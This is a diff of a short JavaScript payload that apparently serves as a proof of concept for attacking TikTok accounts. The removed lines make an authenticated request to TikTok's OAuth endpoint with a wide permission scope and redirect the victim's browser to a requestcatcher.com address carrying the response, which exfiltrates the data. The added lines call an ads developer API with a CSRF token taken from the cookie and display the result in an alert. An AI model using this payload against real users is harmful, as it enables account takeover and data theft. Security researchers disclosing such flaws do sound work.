@@ -1,9 +1,10 @@
 var xhr = new XMLHttpRequest();
-xhr.open('POST', 'https://tiktok.com/passport/open/web/auth/?client_key=7236493407642714114&scope=comment.list,video.publish,user.account.type,user.info.username,user.insights,user.info.basic,video.list,video.insights,comment.list.manage,user.info.stats&aid=1459&source=web&redirect_uri=https://tiktok.com/', true);
+xhr.open('GET', 'https://ads.tiktok.com/marketing_api/api/developer/app/get/', true);
 xhr.setRequestHeader('Content-type', 'application/json');
+xhr.setRequestHeader('X-Csrftoken', '' +cookie);
 xhr.onload = () => {
-    const data = JSON.parse(xhr.responseText);
+   const data = JSON.parse(xhr.responseText);
 var imran= (JSON.stringify(data));
-location.replace("https://imx.requestcatcher.com/?test=" + imran );
+alert(imran)
 };
-xhr.send('{}');
+xhr.send(null);
